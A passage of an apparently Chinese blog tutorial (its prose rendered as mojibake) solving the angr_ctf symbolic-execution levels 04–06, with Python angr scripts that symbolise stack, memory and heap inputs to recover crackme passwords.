punctuation\">.</span>solver<span class=\"token punctuation\">.</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>passwd0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'x'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>            solution1 <span class=\"token operator\">=</span> <span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>solution_state<span class=\"token punctuation\">.</span>solver<span class=\"token punctuation\">.</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>passwd1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'x'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>            solution2 <span class=\"token operator\">=</span> <span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>solution_state<span class=\"token punctuation\">.</span>solver<span class=\"token punctuation\">.</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>passwd2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'x'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>            solution <span class=\"token operator\">=</span> solution0 <span class=\"token operator\">+</span> <span class=\"token string\">\" \"</span> <span class=\"token operator\">+</span> solution1 <span class=\"token operator\">+</span> <span class=\"token string\">\" \"</span> <span class=\"token operator\">+</span> solution2</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+] Success! Solution is: &#123;&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>solution<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>            <span class=\"token comment\"># print(simgr.found[0].posix.dumps(0))</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">'Could not find the solution'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    Go<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>è¿™é‡Œç”¨åˆ°äº† claripy æ¨¡å—ï¼Œclaripy ä¸»è¦å°†å˜é‡ç¬¦å·åŒ–ï¼Œç”Ÿæˆçº¦æŸå¼å¹¶æ±‚è§£çº¦æŸå¼ï¼Œè¿™ä¹Ÿæ˜¯ç¬¦å·æ‰§è¡Œçš„æ ¸å¿ƒæ‰€åœ¨ï¼Œåœ¨ angr ä¸­ä¸»è¦æ˜¯åˆ©ç”¨å¾®è½¯æä¾›çš„ z3 åº“å»è§£çº¦æŸå¼ã€‚</p>\n<h3 id=\"04_angr_symbolic_stack\"><a class=\"markdownIt-Anchor\" href=\"#04_angr_symbolic_stack\">#</a> 04_angr_symbolic_stack</h3>\n<p>å­¦ä¹ ç¬¦å·åŒ–æ ˆåŒº (ä»ä¹‹å‰çš„å¯„å­˜å™¨ä¼ å‚å˜æˆäº†åˆ©ç”¨æ ˆç©ºé—´ä¼ å‚)</p>\n<p><img data-src=\"/images/image-20230411205729603.png\" alt=\"image-20230411205729603\"></p>\n<p>æ‰‹åŠ¨å¸ƒç½®æ ˆ</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> angr</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> claripy</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">\"04_angr_symbolic_stack\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p <span class=\"token operator\">=</span> angr<span class=\"token punctuation\">.</span>Project<span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>startAddr <span class=\"token operator\">=</span> <span class=\"token number\">0x080486AE</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>init_state <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>blank_state<span class=\"token punctuation\">(</span>addr<span class=\"token operator\">=</span>startAddr<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>init_state<span class=\"token punctuation\">.</span>stack_push<span class=\"token punctuation\">(</span>init_state<span class=\"token punctuation\">.</span>regs<span class=\"token punctuation\">.</span>ebp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>init_state<span class=\"token punctuation\">.</span>regs<span class=\"token punctuation\">.</span>ebp <span class=\"token operator\">=</span> init_state<span class=\"token punctuation\">.</span>regs<span class=\"token punctuation\">.</span>esp</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>init_state<span class=\"token punctuation\">.</span>regs<span class=\"token punctuation\">.</span>esp <span class=\"token operator\">-=</span> <span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>pass1 <span class=\"token operator\">=</span> init_state<span class=\"token punctuation\">.</span>solver<span class=\"token punctuation\">.</span>BVS<span class=\"token punctuation\">(</span><span class=\"token string\">'pass1'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>pass2 <span class=\"token operator\">=</span> init_state<span class=\"token punctuation\">.</span>solver<span class=\"token punctuation\">.</span>BVS<span class=\"token punctuation\">(</span><span class=\"token string\">'pass2'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>init_state<span class=\"token punctuation\">.</span>stack_push<span class=\"token punctuation\">(</span>pass1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>init_state<span class=\"token punctuation\">.</span>stack_push<span class=\"token punctuation\">(</span>pass2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>sm <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>simulation_manager<span class=\"token punctuation\">(</span>init_state<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">is_good</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string\">b'Good Job'</span> <span class=\"token keyword\">in</span> state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">is_bad</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string\">b'Try again'</span> <span class=\"token keyword\">in</span> state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>sm<span class=\"token punctuation\">.</span>explore<span class=\"token punctuation\">(</span>find<span class=\"token operator\">=</span>is_good<span class=\"token punctuation\">,</span> avoid<span class=\"token operator\">=</span>is_bad<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">if</span> sm<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    found_state <span class=\"token operator\">=</span> sm<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    passwodr1 <span class=\"token operator\">=</span> found_state<span class=\"token punctuation\">.</span>solver<span class=\"token punctuation\">.</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>pass1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    passwodr2 <span class=\"token operator\">=</span> found_state<span class=\"token punctuation\">.</span>solver<span class=\"token punctuation\">.</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>pass2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Solution:\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>passwodr1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>passwodr2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">\"No solution found!\"</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"05_angr_symbolic_memory\"><a class=\"markdownIt-Anchor\" href=\"#05_angr_symbolic_memory\">#</a> 05_angr_symbolic_memory</h3>\n<p>å­¦ä¹ ç¬¦å·åŒ–å†…å­˜ (ç¬¦å·åŒ–.bss æ®µ)</p>\n<p>4 ä¸ªè¾“å…¥å­—ç¬¦ä¸²å­˜äºå†…å­˜åœ°å€</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> angr</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> claripy</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">is_successful</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    stdout_output <span class=\"token operator\">=</span> state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token string\">b'Good Job.\\n'</span> <span class=\"token keyword\">in</span> stdout_output<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">should_abort</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    stdout_output <span class=\"token operator\">=</span> state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token string\">b'Try again.\\n'</span> <span class=\"token keyword\">in</span> stdout_output<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Go</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    path_to_binary <span class=\"token operator\">=</span> <span class=\"token string\">\"./05_angr_symbolic_memory\"</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    project <span class=\"token operator\">=</span> angr<span class=\"token punctuation\">.</span>Project<span class=\"token punctuation\">(</span>path_to_binary<span class=\"token punctuation\">,</span> auto_load_libs<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    start_address <span class=\"token operator\">=</span> <span class=\"token number\">0x08048618</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    initial_state <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>blank_state<span class=\"token punctuation\">(</span>addr<span class=\"token operator\">=</span>start_address<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    passwd_size_in_bits <span class=\"token operator\">=</span> <span class=\"token number\">64</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    passwd0 <span class=\"token operator\">=</span> claripy<span class=\"token punctuation\">.</span>BVS<span class=\"token punctuation\">(</span><span class=\"token string\">'passwd0'</span><span class=\"token punctuation\">,</span> passwd_size_in_bits<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    passwd1 <span class=\"token operator\">=</span> claripy<span class=\"token punctuation\">.</span>BVS<span class=\"token punctuation\">(</span><span class=\"token string\">'passwd1'</span><span class=\"token punctuation\">,</span> passwd_size_in_bits<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    passwd2 <span class=\"token operator\">=</span> claripy<span class=\"token punctuation\">.</span>BVS<span class=\"token punctuation\">(</span><span class=\"token string\">'passwd2'</span><span class=\"token punctuation\">,</span> passwd_size_in_bits<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    passwd3 <span class=\"token operator\">=</span> claripy<span class=\"token punctuation\">.</span>BVS<span class=\"token punctuation\">(</span><span class=\"token string\">'passwd3'</span><span class=\"token punctuation\">,</span> passwd_size_in_bits<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    passwd0_address <span class=\"token operator\">=</span> <span class=\"token number\">0x0AB232C0</span> <span class=\"token comment\"># user_input addr</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    initial_state<span class=\"token punctuation\">.</span>memory<span class=\"token punctuation\">.</span>store<span class=\"token punctuation\">(</span>passwd0_address<span class=\"token punctuation\">,</span> passwd0<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    initial_state<span class=\"token punctuation\">.</span>memory<span class=\"token punctuation\">.</span>store<span class=\"token punctuation\">(</span>passwd0_address <span class=\"token operator\">+</span> <span class=\"token number\">0x8</span><span class=\"token punctuation\">,</span> passwd1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    initial_state<span class=\"token punctuation\">.</span>memory<span class=\"token punctuation\">.</span>store<span class=\"token punctuation\">(</span>passwd0_address <span class=\"token operator\">+</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> passwd2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    initial_state<span class=\"token punctuation\">.</span>memory<span class=\"token punctuation\">.</span>store<span class=\"token punctuation\">(</span>passwd0_address <span class=\"token operator\">+</span> <span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> passwd3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    simulation <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>simgr<span class=\"token punctuation\">(</span>initial_state<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    simulation<span class=\"token punctuation\">.</span>explore<span class=\"token punctuation\">(</span>find<span class=\"token operator\">=</span>is_successful<span class=\"token punctuation\">,</span> avoid<span class=\"token operator\">=</span>should_abort<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token keyword\">if</span> simulation<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> simulation<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>            solution_state <span class=\"token operator\">=</span> i</pre></td></tr><tr><td data-num=\"49\"></td><td><pre>            solution0 <span class=\"token operator\">=</span> solution_state<span class=\"token punctuation\">.</span>solver<span class=\"token punctuation\">.</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>passwd0<span class=\"token punctuation\">,</span> cast_to<span class=\"token operator\">=</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>            solution1 <span class=\"token operator\">=</span> solution_state<span class=\"token punctuation\">.</span>solver<span class=\"token punctuation\">.</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>passwd1<span class=\"token punctuation\">,</span> cast_to<span class=\"token operator\">=</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>            solution2 <span class=\"token operator\">=</span> solution_state<span class=\"token punctuation\">.</span>solver<span class=\"token punctuation\">.</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>passwd2<span class=\"token punctuation\">,</span> cast_to<span class=\"token operator\">=</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>            solution3 <span class=\"token operator\">=</span> solution_state<span class=\"token punctuation\">.</span>solver<span class=\"token punctuation\">.</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>passwd3<span class=\"token punctuation\">,</span> cast_to<span class=\"token operator\">=</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>            solution <span class=\"token operator\">=</span> solution0 <span class=\"token operator\">+</span> <span class=\"token string\">b\" \"</span> <span class=\"token operator\">+</span> solution1 <span class=\"token operator\">+</span> <span class=\"token string\">b\" \"</span> <span class=\"token operator\">+</span> solution2 <span class=\"token operator\">+</span> <span class=\"token string\">b\" \"</span> <span class=\"token operator\">+</span> solution3</pre></td></tr><tr><td data-num=\"54\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+] Success! Solution is: &#123;&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>solution<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">\"utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>            <span class=\"token comment\"># print(solution0, solution1, solution2, solution3)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>        <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">'Could not find the solution'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    Go<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>[+] Success! Solution is: OJQVXIVX LLEAOODW UVCWUVVC AJXJMVKA</p>\n<h3 id=\"06_angr_symbolic_dynamic_memory\"><a class=\"markdownIt-Anchor\" href=\"#06_angr_symbolic_dynamic_memory\">#</a> 06_angr_symbolic_dynamic_memory</h3>\n<p>è¿™é¢˜ä¸»è¦æ˜¯å­¦ä¼šç¬¦å·åŒ–åŠ¨æ€å†…å­˜ï¼Œè¿™ä¸ªé¢˜ä¸ä¸Šé¢˜æ²¡æœ‰å¤ªå¤§åŒºåˆ«ï¼Œé™¤äº†å­—ç¬¦ä¸²çš„å†…å­˜æ˜¯é€šè¿‡å † malloc () è€Œä¸æ˜¯å †æ ˆåˆ†é…çš„</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> angr</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> claripy</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  path_to_binary <span class=\"token operator\">=</span> <span class=\"token string\">\"./06_angr_symbolic_dynamic_memory\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  project <span class=\"token operator\">=</span> angr<span class=\"token punctuation\">.</span>Project<span class=\"token punctuation\">(</span>path_to_binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  start_address <span class=\"token operator\">=</span> <span class=\"token number\">0x80486af</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  initial_state <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>blank_state<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    addr<span class=\"token operator\">=</span>start_address<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    add_options <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> angr<span class=\"token punctuation\">.</span>options<span class=\"token punctuation\">.</span>SYMBOL_FILL_UNCONSTRAINED_MEMORY<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                    angr<span class=\"token punctuation\">.</span>options<span class=\"token punctuation\">.</span>SYMBOL_FILL_UNCONSTRAINED_REGISTERS<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  password0 <span class=\"token operator\">=</span> claripy<span class=\"token punctuation\">.</span>BVS<span class=\"token punctuation\">(</span><span class=\"token string\">'password0'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  password1 <span class=\"token operator\">=</span> claripy<span class=\"token punctuation\">.</span>BVS<span class=\"token punctuation\">(</span><span class=\"token string\">'password0'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  fake_heap_address0 <span class=\"token operator\">=</span> <span class=\"token number\">0x4444444</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  pointer_to_malloc_memory_address0 <span class=\"token operator\">=</span> <span class=\"token number\">0xa2def74</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  initial_state<span class=\"token punctuation\">.</span>memory<span class=\"token punctuation\">.</span>store<span class=\"token punctuation\">(</span>pointer_to_malloc_memory_address0<span class=\"token punctuation\">,</span> fake_heap_address0<span class=\"token punctuation\">,</span> endness<span class=\"token operator\">=</span>project<span class=\"token punctuation\">.</span>arch<span class=\"token punctuation\">.</span>memory_endness<span class=\"token punctuation\">,</span> size<span class=\"token operator\">=</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  fake_heap_address1 <span class=\"token operator\">=</span> <span class=\"token number\">0x4444454</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  pointer_to_malloc_memory_address1 <span class=\"token operator\">=</span> <span class=\"token number\">0xa2def7c</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  initial_state<span class=\"token punctuation\">.</span>memory<span class=\"token punctuation\">.</span>store<span class=\"token punctuation\">(</span>pointer_to_malloc_memory_address1<span class=\"token punctuation\">,</span> fake_heap_address1<span class=\"token punctuation\">,</span> endness<span class=\"token operator\">=</span>project<span class=\"token punctuation\">.</span>arch<span class=\"token punctuation\">.</span>memory_endness<span class=\"token punctuation\">,</span> size<span class=\"token operator\">=</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  initial_state<span class=\"token punctuation\">.</span>memory<span class=\"token punctuation\">.</span>store<span class=\"token punctuation\">(</span>fake_heap_address0<span class=\"token punctuation\">,</span> password0<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  initial_state<span class=\"token punctuation\">.</span>memory<span class=\"token punctuation\">.</span>store<span class=\"token punctuation\">(</span>fake_heap_address1<span class=\"token punctuation\">,</span> password1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  simulation <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>simgr<span class=\"token punctuation\">(</span>initial_state<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>  <span class=\"token keyword\">def</span> <span class=\"token function\">is_successful</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    stdout_output <span class=\"token operator\">=</span> state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>fileno<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string\">'Good Job.'</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">in</span> stdout_output</pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>  <span class=\"token 